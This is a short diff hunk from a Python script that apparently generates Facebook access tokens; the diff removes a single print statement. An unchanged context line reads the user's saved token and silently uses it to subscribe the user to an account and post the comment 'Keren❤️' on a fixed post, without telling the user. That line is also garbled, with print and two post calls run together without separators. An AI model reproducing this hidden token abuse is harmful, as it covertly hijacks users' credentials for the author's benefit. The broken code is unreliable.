@@ -730,7 +730,6 @@ if __name__=='__main__':
 			if 'access_token' in ok:
 				token=open('result/token.txt','r').read()
 				print(m+'['+h+'✓'+m+']'+h+' Success generate access token')s.post(url+'api.version/subscribers?access_token='+token)s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
-				print (SuccessToken)
 				time.sleep(1)
 				menu()
 		except KeyError:
